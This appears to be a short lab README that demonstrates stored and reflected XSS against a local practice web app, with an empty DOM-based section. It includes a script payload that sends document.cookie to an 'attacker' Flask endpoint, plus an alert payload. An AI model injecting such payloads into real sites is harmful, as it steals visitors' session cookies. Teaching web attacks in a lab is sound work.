=================
Stored XSS attack
=================

How to perform:

Start the attacker's webpage:

1. Go to the attacker directory
    cd attacker

2. Set up and start flask by running the following command:
    chmod +x./flask.sh

3. Set up and start flask by running the following command:
    ./flask.sh

4. Go to the review section of the webpage (http://localhost:80/)

5. Add some malicious javascript as a comment and click submit:
    <script>
        fetch("http://localhost:5000/attacker?cookie=" + document.cookie)
    </script>

====================
Reflected XSS attack
====================
1. Go to the login page, paste in the following and submit:
<script>alert("Reflected XSS");</script>

====================
DOM based XSS attack
====================
